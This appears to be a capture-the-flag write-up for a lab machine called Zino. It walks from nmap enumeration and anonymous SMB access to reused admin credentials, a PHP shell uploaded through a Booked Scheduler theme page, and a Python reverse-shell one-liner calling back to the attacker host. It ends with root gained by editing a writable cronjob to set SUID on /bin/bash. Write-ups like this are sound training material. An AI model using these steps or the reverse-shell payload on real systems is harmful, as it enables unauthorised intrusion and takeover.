First Enumeration with nmap 

`nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn <IP>`

```
# Nmap 7.93 scan initiated Thu Dec 29 16:37:36 2022 as: nmap -p- --min-rate 10000 -oN fulltcp.txt -v -Pn 192.168.108.64
Nmap scan report for 192.168.108.64
Host is up (0.19s latency).
Not shown: 65529 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3306/tcp open  mysql
8003/tcp open  mcreport

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec 29 16:38:29 2022 -- 1 IP address (1 host up) scanned in 52.40 seconds
```

Got some interesting ports open, let's run default nmap scripts on those port to know what services run on them.

`nmap -sC -sV -oN normal.tcp -p 21,22,445,139,8003,3306 -Pn <IP>`

```
# Nmap 7.93 scan initiated Thu Dec 29 16:39:44 2022 as: nmap -sC -sV -oN normal.tcp -p 21,22,445,139,8003,3306 -Pn 192.168.108.64                              [19/80]
Nmap scan report for 192.168.108.64
Host is up (0.19s latency).        
                                         
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3                                            
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)          
| ssh-hostkey:         
|   2048 b26675501b18f5e99fdb2cd4e3957a44 (RSA)                                    
|   256 912d26f1baafd18b698f814a32af9c77 (ECDSA)                                   
|_  256 ec6fdf8bce19138a52573e72a3146f40 (ED25519)    
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)          
3306/tcp open  mysql?        
| fingerprint-strings: 
|   NULL, NotesRPC:                      
|_    Host '192.168.49.108' is not allowed to connect to this MariaDB server                                                                                          
8003/tcp open  http        Apache httpd 2.4.38                                                                                                                        
|_http-server-header: Apache/2.4.38 (Debian)                                       
|_http-title: Index of /                                                           
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-02-05 21:02  booked/
|_
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-ser
vice :
SF-Port3306-TCP:V=7.93%I=7%D=12/29%Time=63ADB4C5%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(NotesRPC
SF:,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: Hosts: ZINO, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: zino
|_  System time: 2022-12-29T10:40:03-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m13s, median: 0s
| smb2-time: 
|   date: 2022-12-29T15:40:05
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
```

Now we know what services are running. we start by enumerating smb 

`smbclient -L <IP> -N`

![image](https://user-images.githubusercontent.com/87468669/209984033-1f21db08-29ee-4697-9a74-6ed1161ed436.png)

Let's chck if we have anonymous access to the share zino.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Zino]
└─$ smbclient //192.168.108.64/zino/ -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jul  9 20:11:49 2020
  ..                                  D        0  Tue Apr 28 14:38:53 2020
  .bash_history                       H        0  Tue Apr 28 16:35:28 2020
  error.log                           N      265  Tue Apr 28 15:07:32 2020
  .bash_logout                        H      220  Tue Apr 28 14:38:53 2020
  local.txt                           N       33  Thu Dec 29 17:24:59 2022
  .bashrc                             H     3526  Tue Apr 28 14:38:53 2020
  .gnupg                             DH        0  Tue Apr 28 15:17:02 2020
  .profile                            H      807  Tue Apr 28 14:38:53 2020
  misc.log                            N      424  Tue Apr 28 15:08:15 2020
  auth.log                            N      368  Tue Apr 28 15:07:54 2020
  access.log                          N     5464  Tue Apr 28 15:07:09 2020
  ftp                                 D        0  Tue Apr 28 15:12:56 2020
g  
                7158264 blocks of size 1024. 4726784 blocks available
smb: \> mget *
Get file .bash_history? y
NT_STATUS_ACCESS_DENIED opening remote file \.bash_history
Get file error.log? y
getting file \error.log of size 265 as error.log (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
Get file .bash_logout? y
getting file \.bash_logout of size 220 as .bash_logout (0.3 KiloBytes/sec) (average 0.2 KiloBytes/sec)
Get file local.txt? y
getting file \local.txt of size 33 as local.txt (0.0 KiloBytes/sec) (average 0.1 KiloBytes/sec)
Get file .bashrc? y
getting file \.bashrc of size 3526 as .bashrc (1.9 KiloBytes/sec) (average 0.7 KiloBytes/sec)
Get file .profile? y
getting file \.profile of size 807 as .profile (1.0 KiloBytes/sec) (average 0.8 KiloBytes/sec)
Get file misc.log? y
getting file \misc.log of size 424 as misc.log (0.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)
Get file auth.log? y
getting file \auth.log of size 368 as auth.log (0.5 KiloBytes/sec) (average 0.7 KiloBytes/sec)
Get file access.log? y
getting file \access.log of size 5464 as access.log (2.9 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> 
```

Great we had anonymous access to the share, and was able to download the files available in the share.Lt's check the contents on the files.

![image](https://user-images.githubusercontent.com/87468669/209985215-54a65646-3bc8-4d04-ae0c-a4cc34431252.png)

chcking the contents of other files was a rabbit hole, so i checked misc.log file and got some creds. Now let's enumerate the http service on port 8003.

![image](https://user-images.githubusercontent.com/87468669/209985614-7734a34c-dfab-4c39-9368-98f5200d4d22.png)

Great the webserver is running a cms named book scheduler, let's login with the creds found earlier `admin:adminadmin`

![image](https://user-images.githubusercontent.com/87468669/209986210-effc1358-a1d2-4abe-8978-7b6610feb251.png)

Bull's eye we got in the admin panel, now let's navigate to /admin/manage_theme.php dircetory.

![image](https://user-images.githubusercontent.com/87468669/209986669-e8651ece-24dc-406a-aefc-bac1f88bf20d.png)

Uploaded a php cmd shell, hit the update button and navigate to custom_favicon.php directory.

![image](https://user-images.githubusercontent.com/87468669/209987226-150c61a8-d1c4-4af2-aa1a-7aaf333029f8.png)

Boom!!! got RCE, now let's get a reverse shell. Fire ncat listener

![image](https://user-images.githubusercontent.com/87468669/209987294-50fe8065-0414-4e84-b926-7f1de4460f0c.png)

Reverse shell payload

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.108",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![image](https://user-images.githubusercontent.com/87468669/209987409-25fe6879-2877-4b7e-a4b2-56ec57ba8e8a.png)

Check back ncat listener and pheeeeew we got a reverse shell. Now let's stabilize and escalate privs.

![image](https://user-images.githubusercontent.com/87468669/209987940-760e6a56-818b-42e6-b7e6-0e0f450bcae2.png)

After checking file to esc to root, i check the crontab and saw a python cronjob running as root every 3 mins on the target.

![image](https://user-images.githubusercontent.com/87468669/209988156-dd3e42ac-14d3-4a1d-8ec6-726310b6c2a5.png)

since we have read write perm to the file, let's edit and craft an suid for /bin/bash. 

`chmod +s /bin/bash`

![image](https://user-images.githubusercontent.com/87468669/209988426-059770c2-1c41-4313-bf5d-260fff5e928a.png)

change the commands to be run to creating an suid on bash instead of removing files from th reserved dir. Waited for 3 mins.

![image](https://user-images.githubusercontent.com/87468669/209988914-33184811-df65-483c-bdb9-eba66fd92273.png)

And boom!!! we are root😎😎
